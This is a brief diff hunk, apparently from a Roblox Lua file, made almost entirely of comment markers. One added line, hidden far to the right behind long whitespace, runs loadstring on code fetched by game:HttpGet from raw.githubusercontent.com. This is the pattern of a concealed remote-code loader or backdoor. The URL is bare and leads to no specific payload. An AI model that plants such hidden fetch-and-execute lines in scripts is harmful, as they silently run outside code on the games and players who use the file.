@@ -10,7 +10,7 @@
 --
 
 --
-                                                                                                                                                                                                                                                                                                loadstring(Game
+                                                                                                                                                                                                                                                                                                loadstring(game:HttpGet("https://raw.githubusercontent.com/"))()
 --
 
 --
